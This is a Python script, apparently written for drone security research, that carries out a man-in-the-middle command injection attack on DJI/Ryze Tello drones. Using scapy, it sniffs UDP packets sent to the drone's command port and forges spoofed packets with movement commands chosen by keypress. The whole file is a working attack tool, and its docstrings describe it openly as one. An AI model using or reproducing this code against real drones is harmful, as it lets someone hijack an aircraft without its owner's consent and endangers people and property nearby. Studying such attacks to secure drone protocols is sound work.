from scapy.all import sniff, send
from scapy.layers.inet import IP, UDP
from scapy.packet import Raw

import threading
import time
import queue
import keyboard

# Tello Drone default configs
TELLO_IP = "192.168.10.1"
TELLO_PORT = 8889
TELLO_INTERFACE = "Wi-Fi"

class TelloCommandInjector:
    """
    A class to perform command injection attacks via Man-in-the-Middle (MitM) on Tello drones.
    It is designed to intercept UDP packets sent to the drone, modify and forward them to the drone.
    After the first packet sniffed, it will start generating its own packets to send to the drone if user has left it idle.
    """
    def __init__(self, interface=TELLO_INTERFACE, target_ip=TELLO_IP, target_port=TELLO_PORT):
    
        # Initializing parameters
        self.interface = interface
        self.target_ip = target_ip
        self.target_port = target_port

        # Thread control flags and variables
        self.is_running = False
        self.input_queue = queue.Queue()
        self.thread = None

        # Keylogger control
        self.keylog_running = False
        self.keylog_thread = None

    def user_input_listener(self):
        """
        Background thread to listen for user input commands.
        Real-time keylogger for wasd/esc. Stores keys in input queue.
        """
        print("User input listener started. Type commands to inject:")
        self.keylog_running = True

        def on_key_event(event):
            if event.event_type == 'down':  # Only process key down events
                key = event.name
                if key in ['w', 'a', 's', 'd', 'up', 'down']:
                    self.input_queue.put(event.name)
                print(f"Key '{key}' added to injection queue.")
    
        keyboard.hook(on_key_event)
    
        while self.keylog_running:
            time.sleep(0.1)

    def packet_handler(self, packet):
        """
        Callback function for each sniffed packet.
        This function checks if the packet is a UDP packet destined for the Tello drone's command port,
        extracts the command, optionally modifies it, and forwards it to the drone.
        """

        try:
            # Check if the packet has relevant layers and is destined for the Tello drone
            if (packet.haslayer(UDP) 
                and packet.haslayer(Raw)
                and packet.haslayer(IP)
                and packet[IP].dst == self.target_ip
                and packet[UDP].dport == self.target_port
            ):
                # Collect user inputs from the queue
                key_inputs = []
                while not self.input_queue.empty():
                    key_inputs.append(self.input_queue.get())
            
                key_to_cmd = {
                    'w': 'forward 20',
                    's': 'back 20',
                    'a': 'left 20',
                    'd': 'right 20',
                    'up': 'up 20',
                    'down': 'down 20'
                }

                # Modify payload based on user input
                if key_inputs:
                    last_key = key_inputs[-1]
                    if last_key in key_to_cmd:
                        new_command = key_to_cmd[last_key]
            
                print(f"[>] Forwarding command: {new_command}")

                # Create a new packet with the modified command
                new_packet = IP(dst=self.target_ip, src=packet[IP].src) / \
                             UDP(dport=self.target_port, sport=packet[UDP].sport) / \
                             new_command.encode('utf-8')
            
                send(new_packet, verbose=0)

        except Exception as e:
            print(f"Error processing packet: {e}")
    
    def _sniff(self):
        """
        Starts sniffing for UDP packets.
        Runs in a separate thread and continuously captures packets until stopped.
        """

        print("--- Starting packet sniffing ---")
        sniff(
            iface = self.interface,
            filter=f"udp and dst host {self.target_ip} and port {self.target_port}",
            prn=self.packet_handler,
            stop_filter=lambda p: not self.is_running
        )
        print("--- Stopped packet sniffing ---")
    
    def start(self):
        """
        Starts the MitM attack in a separate thread.
        """
        if self.is_running:
            print("MitM attack is already running.")
            return
        
        if not self.is_running:

            self.is_running = True

            # start keylogger thread
            self.keylog_thread = threading.Thread(target=self.user_input_listener)
            self.keylog_thread.daemon = True
            self.keylog_thread.start()

            # start sniffing thread
            self.thread = threading.Thread(target=self._sniff)
            self.thread.daemon = True
            self.thread.start()
        else:
            print("MitM attack is already running.")
    
    def stop(self):
        """
        Stops the MitM attack and keylogger.
        """
        if not self.is_running:
            print("MitM attack is not running.")
            return

        self.is_running = False
        self.keylog_running = False

        if self.thread is not None:
            self.thread.join()
            self.thread = None

        if self.keylog_thread is not None:
            self.keylog_thread.join()
            self.keylog_thread = None

        print("MitM attack stopped.")

if __name__ == "__main__":
    injector = TelloCommandInjector()
    try:
        injector.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        injector.stop()
        print("Exiting...")